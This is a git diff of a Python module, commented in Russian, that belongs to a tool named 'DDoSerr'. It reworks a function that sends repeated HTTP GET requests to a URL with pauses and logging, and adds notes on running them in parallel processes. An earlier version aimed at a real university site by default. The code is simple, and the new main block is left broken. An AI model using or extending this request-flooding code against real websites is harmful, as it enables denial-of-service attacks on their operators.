@@ -5,7 +5,7 @@
 
 """
 Модуль отправки HTTP-запросов для DDoSerr.
-v.1.3.2 от 05.07.2018.
+v.1.5.1b. от 09.07.2018.
 """
 
 """
@@ -18,97 +18,69 @@ v.1.3.2 от 05.07.2018.
 
 #Используем библиотеку requests.
 import requests
-#Подключаем модуль многопроцессорности и многопоточности, а точнее,
-#функцию Pool.
-from multiprocessing import Pool
+#Подключаем модуль времени.
+import time
+#Подключаем модуль взаимодействия с системой.
+import os
+#Подключаем готовый модуль логгирования.
+import logging
 
-def http_connection(url="http://127.0.0.1"):
+#Настройка логгирования.
+logging.basicConfig(filename='log.log',level=logging.INFO, format='%(asctime)s %(message)s', datefmt='%d.%m.%Y - %I:%M:%S |')
+#Пока не нужен подробный лог.
+#logging.basicConfig(filename='log.log',level=logging.DEBUG)
+
+
+def http_connection(repeat, pause, url="http://127.0.0.1"):
     """
     Функция для создания одного запроса к сайту и получения ответа.
-    Если не задаётся url, то стучится в localhost.
     """
     #https://httpbin.org/get
     #Если не задаётся извне значение url, то берётся указанное.
     #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     #!Позже добавить в аргументы user_agent!
     #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    request = requests.get(url)
-    #Для post запросов пригодится в будущем.
-    #request = requests.post("http://httpbin.org/post")
     
-    status = request.status_code
-    print(status)
-    head = request.headers['content-type']
-    print(head)
-    
-    return(status, head)
-    
-    
-    """
-    СДЕЛАНО.
-    Есть функция http_connection, вызывающая одно соединение.
-    Надо сделать функцию http_multiconnection, вызывающую несколько
-    соединений в своих процессах.
-    В основной программе вместо вызова http_connection 
-    вызывать http_multiconnection.
-    """
-    
-def http_multiconnection(proc_num, pause, url="https://www.vsu.ru"):
-    
-    """
-    Реализация многопоточности.
-    #Получается 4 процесса: один родительский и 3 дочерних.
-    """
-    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    #Сделать настройку url (из конфига и командной строки).
-    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    
-    #(Добавить в принимаемые аргументы.)
-
-    """
-    Всю эту функцию надо перекинуть в основную программу,
-    но не как функцию, а просто в конец.
-    """
-    proc = int(proc_num)
-
-    #Создаём пул из 'proc' штук работников (процессов).
-    pool = Pool(processes=proc)
-
-    #Даём им задание по одному (поэтому в цикле) и получаем результат.
-    #Создаётся 'proc' штук процессов с заданием.
-#!!!Этот цикл надо в основную программу, т.к. его НЕ НАДО вызывать больше 1 раза!
-    for _ in range(proc):
-        result = pool.apply_async(http_connection, (url,))
-        #Для ускорения работы этот print можно убрать.
-    print(result.get(timeout=1))
-    return(result)
-    
-    #apply_async даёт задачу только одному процессу. Не подходит.
-    #result = pool.apply_async(http_connection, ("https://www.vsu.ru",))
-    
-    
-    #Вывод результата с таймаутом в 1 секунду 
-    #(если вдруг будет работать слишком долго).
-
-    #print(result.get(timeout=1))
 
     
-    """
-    !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    Передать сюда количество повторений (настоящий repeat)
-    и количество запросов в секунду speed (пока сделать speed = 1).
+    for _ in range(repeat):
+        request = requests.get(url)
+        #Для post запросов пригодится в будущем.
+        #request = requests.post("http://httpbin.org/post")
     
-    !!!Speed больше нет, есть proc_num, т.к. это количество процессов.
+        status = str(request.status_code)
+        head = str(request.headers['content-type'])
+        #Этот вывод результата можно убрать для повышения производительности.
+        print(status, head)
+        
+        answer = str('\t' + status + '\t' + head)
+        
+        #Логгируем запуск процесса с его PID.
+        logging.info('Process ' + str(os.getpid()) + ' received the task.')
+        #Логгируем результаты.
+        logging.info('Answer: ' + answer)
+        
+        #Для многопоточности. Вывод result в message.
+        #Из объекта берутся значения методом get() с таймаутом в 1 секунду.
+        ##message = str(result.get(timeout=1))
+        #message = str(status + '\t' + head)
+  
+        
+        #Задержка перед повтором цикла.
+        time.sleep(pause)
     
-    В одном процессе надо сделать много запросов.
-    
-    СДЕЛАНО - Переименовать repeat, т.к. это не количество повторов запросов,
-    а количество запросов в секунду (speed). - это proc_num.
-    
-    !Сделать количество повторов вызова функции - настоящий repeat.
-    !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    """
-    
+"""
+!!!Проверить одновременность работы через apply_async! 
+Если не одновременно, то переделать под map_async!
+Надо через MAP так:
+https://stackoverflow.com/questions/11996632/multiprocessing-in-python-while-limiting-the-number-of-running-processes
+Перевод (кривенький): http://qaru.site/questions/306301/multiprocessing-in-python-while-limiting-the-number-of-running-processes
+
+
+
+Это должно работать, если вместо url сделать список адресов с задерками.
+"""
+
     
 """
 То, что находится внутри if __name__ == "__main__" будет выполнено 
@@ -118,6 +90,7 @@ if __name__ == "__main__":
     """
     Реализация многопоточности для самостоятельного запуска модуля.
     Хорошо работает.
+    Но в докстринге, т.к. используется другой способ.
     #Получается 4 процесса: один родительский и 3 дочерних.
     
     
@@ -137,5 +110,5 @@ if __name__ == "__main__":
     """
     
     #Запуск функции.
-    #http_connection()
-    http_multiconnection()
+    http_connection(repeat, pause, url)
+
